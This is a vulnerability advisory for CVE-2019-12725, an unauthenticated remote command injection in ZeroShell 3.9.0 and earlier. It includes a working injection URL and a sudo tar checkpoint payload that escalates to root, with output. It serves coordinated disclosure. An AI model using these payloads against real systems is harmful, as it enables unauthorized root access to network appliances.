# CVE-2019-12725: Remote Command Execution in ZeroShell
[![](https://img.shields.io/badge/Attack%20Vector-Remote-red?style=flat-square)]() [![](https://img.shields.io/badge/Privileges%20Required-None-red?style=flat-square)]() [![](https://img.shields.io/badge/User%20Interaction-No-red?style=flat-square)]()


__Vendor:__ ZeroShell<br>
__Vendor URL:__ https://zeroshell.org<br>
__Versions affected:__ ZeroShell <= 3.9.0<br>
__Discovered by:__ Juan Manuel Fernandez ([@TheXC3LL](https://twitter.com/TheXC3LL))<br>
__Public fix:__ Yes<br>
__Proof of Concept:__ Yes ([ref](https://github.com/blackarrowsec/advisories/blob/master/2019/CVE-2019-12725/CVE-2019-12725.py)) <br>

## Summary 
ZeroShell 3.9.0 (and before) is vulnerable to RCE because some parameters sent to the endpoint are used by a bash script without a properly sanitization.

## Details

An unauthenticated attacker can execute arbitrary commands via command injection with new-line characters:
```
/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509view&User=Admin&x509type='%0Auname -a%0A'
```

Additionally the Apache user can execute the "tar" command as root (/etc/sudoers):
```
(...)
apache ALL= NOPASSWD:   /bin/tar
(...)
```

This can be abused in order to elevate privileges via the RCE:

``` 
/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=id%0A'

uid=0(root) gid=0(root) groups=0(root)
```
## Impact

An unauthenticated attacker can execute commands remotely as root.

## Recommendation
Update to last version.

## Timeline
* 29/05/2019 - Reported the vulnerability to vendor
* 29/05/2019 - Vendor ACK
* 05/06/2019 - CVE Identifier (CVE-2019-12725) assigned by MITRE
* 04/08/2019 - Security Release with fix (ZeroShell 3.9.3)

#

[![](https://img.shields.io/badge/www-blackarrow.net-E5A505?style=flat-square)](https://www.blackarrow.net) [![](https://img.shields.io/badge/twitter-@BlackArrowSec-00aced?style=flat-square&logo=twitter&logoColor=white)](https://twitter.com/BlackArrowSec) [![](https://img.shields.io/badge/linkedin-@BlackArrowSec-0084b4?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/company/blackarrowsec/)
